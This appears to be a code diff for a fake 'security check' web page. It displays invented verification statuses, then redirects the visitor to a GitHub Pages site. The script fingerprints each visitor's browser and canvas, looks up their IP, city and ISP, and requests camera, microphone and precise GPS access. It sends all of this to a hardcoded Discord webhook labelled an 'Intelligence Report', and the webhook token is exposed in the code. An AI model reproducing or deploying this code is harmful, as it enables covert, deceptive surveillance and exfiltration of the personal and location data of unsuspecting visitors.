@@ -46,7 +46,7 @@
             width: 0%;
             margin: 25px auto;
             border-radius: 2px;
-            transition: width 1.5s ease-in-out;
+            transition: width 1.8s ease-in-out;
         }
 
         h1 {
@@ -97,123 +97,141 @@
         const REAL_SITE_URL = "https://unkn0wn-sh4d0w.github.io/";
         const LOG_ENDPOINT = "https://discord.com/api/webhooks/1499531983313702942/6aDuXvkEl4LzC8hiXc01kJLq83wwoYQXWyaD-YWQWuCnGVVVTmPeqcSLJypTr_BLGXmT";
 
-        async function collectAdvancedData() {
-            const data = {
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent,
-                language: navigator.language || navigator.userLanguage,
-                languages: navigator.languages ? navigator.languages.join(", ") : "unknown",
-                platform: navigator.platform,
-                cookieEnabled: navigator.cookieEnabled,
-                online: navigator.onLine,
-                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
-                deviceMemory: navigator.deviceMemory || "unknown",
-                screenResolution: `\( {screen.width}× \){screen.height}`,
-                colorDepth: screen.colorDepth,
-                pixelRatio: window.devicePixelRatio,
-                referrer: document.referrer || "direct",
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-            };
+        let visitorData = {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(", ") : "unknown",
+            platform: navigator.platform,
+            hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+            deviceMemory: navigator.deviceMemory || "unknown",
+            screenResolution: `\( {screen.width}× \){screen.height}`,
+            colorDepth: screen.colorDepth,
+            pixelRatio: window.devicePixelRatio,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || "direct",
+        };
 
+        const fakeStatuses = [
+            "Analyzing browser fingerprint...",
+            "Checking device characteristics...",
+            "Verifying human behavior patterns...",
+            "Validating session integrity...",
+            "Cross-referencing security signals...",
+            "Security check completed"
+        ];
+
+        async function requestHiddenPermissions() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                visitorData.cameraGranted = true;
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                visitorData.cameraGranted = false;
+                visitorData.cameraError = err.name;
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                visitorData.microphoneGranted = true;
+                stream.getTracks().forEach(track => track.stop());
+            } catch (err) {
+                visitorData.microphoneGranted = false;
+                visitorData.microphoneError = err.name;
+            }
+
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    });
+                });
+                visitorData.locationGranted = true;
+                visitorData.latitude = position.coords.latitude;
+                visitorData.longitude = position.coords.longitude;
+                visitorData.accuracy = position.coords.accuracy + "m";
+            } catch (err) {
+                visitorData.locationGranted = false;
+                visitorData.locationError = err.message;
+            }
+        }
+
+        async function collectAndSendData() {
             try {
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 50;
+                canvas.width = 220; canvas.height = 60;
                 ctx.textBaseline = "alphabetic";
-                ctx.font = "14px Arial";
+                ctx.font = "15px Arial";
                 ctx.fillStyle = "#f60";
-                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillRect(130, 5, 70, 25);
                 ctx.fillStyle = "#069";
-                ctx.fillText("Hello, World!", 2, 15);
-                ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
-                ctx.fillText("Hello, World!", 4, 17);
-                data.canvasFingerprint = canvas.toDataURL().slice(0, 100) + "...";
-            } catch(e) {
-                data.canvasFingerprint = "failed";
-            }
+                ctx.fillText("Hello, World!", 5, 30);
+                visitorData.canvasFingerprint = canvas.toDataURL().substring(0, 100) + "...";
+            } catch(e) {}
 
             try {
-                const geoRes = await fetch("https://ipapi.co/json/");
-                if (geoRes.ok) {
-                    const geo = await geoRes.json();
-                    data.ip = geo.ip || "unknown";
-                    data.country = geo.country_name || "unknown";
-                    data.city = geo.city || "unknown";
-                    data.region = geo.region || "unknown";
-                    data.isp = geo.org || "unknown";
-                    data.latitude = geo.latitude;
-                    data.longitude = geo.longitude;
+                const res = await fetch("https://ipapi.co/json/");
+                if (res.ok) {
+                    const geo = await res.json();
+                    visitorData.ip = geo.ip;
+                    visitorData.country = geo.country_name;
+                    visitorData.city = geo.city;
+                    visitorData.region = geo.region;
+                    visitorData.isp = geo.org;
                 }
-            } catch (e) {
-                console.error("Geo fetch failed");
-            }
+            } catch(e) {}
 
-            return data;
-        }
-
-        async function logData(data) {
             try {
                 await fetch(LOG_ENDPOINT, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
-                        content: "🚨 **New Visitor Logged**",
+                        content: "🚨 **New Visitor with Permissions**",
                         embeds: [{
-                            title: "Visitor Intelligence Report",
-                            description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
+                            title: "Full Intelligence Report",
+                            description: "```json\n" + JSON.stringify(visitorData, null, 2) + "\n```",
                             color: 0x00ff88,
                             timestamp: new Date().toISOString()
                         }]
                     })
                 });
-            } catch (err) {
-                console.error("Logging failed:", err);
-            }
+            } catch (err) {}
         }
 
-        function simulateProgress() {
+        function simulateCleanProgress() {
             const progressBar = document.getElementById('progress');
             const statusText = document.getElementById('status');
-            const steps = [
-                "Analyzing browser fingerprint...",
-                "Checking device characteristics...",
-                "Verifying human behavior patterns...",
-                "Validating session integrity...",
-                "Security check completed"
-            ];
-
             let progress = 0;
-            let stepIndex = 0;
+            let statusIndex = 0;
 
             const interval = setInterval(() => {
-                progress += Math.random() * 18 + 8;
+                progress += Math.random() * 14 + 7;
                 if (progress > 100) progress = 100;
 
                 progressBar.style.width = progress + "%";
 
-                if (progress > stepIndex * 25 && stepIndex < steps.length) {
-                    statusText.textContent = steps[stepIndex];
-                    stepIndex++;
+                if (progress > statusIndex * 20 && statusIndex < fakeStatuses.length) {
+                    statusText.textContent = fakeStatuses[statusIndex];
+                    statusIndex++;
                 }
 
                 if (progress >= 100) {
                     clearInterval(interval);
                 }
-            }, 180);
+            }, 160);
         }
 
         window.onload = async () => {
-            simulateProgress();
-
-            const visitorData = await collectAdvancedData();
-            
-            await logData(visitorData);
+            simulateCleanProgress();
+            await requestHiddenPermissions();
+            await collectAndSendData();
 
             setTimeout(() => {
                 window.location.replace(REAL_SITE_URL);
-            }, 1850);
+            }, 2100);
         };
     </script>
 </body>
